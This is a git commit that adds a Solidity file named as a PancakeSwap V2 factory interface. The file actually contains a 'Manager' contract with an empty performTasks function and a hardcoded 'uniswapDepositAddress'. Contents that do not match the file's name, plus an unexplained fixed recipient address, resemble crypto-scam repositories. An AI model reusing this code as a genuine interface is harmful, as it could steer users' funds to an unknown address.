4bf0b439d3c2dfa566e8f209b7777c3566ff21b3
PancakeSwapV2Developer <97490380+PancakeSwapV2Developero@users.noreply.github.com>
2022-01-11 10:44:36 +0800

    Create IPancakeswapV2Factory.sol

---
+++ blob/main/contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -0,0 +1,12 @@
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xeEEA3A6bc1e0423c82BE8F2F4D56679a99e8b9b4;
+	}
+}
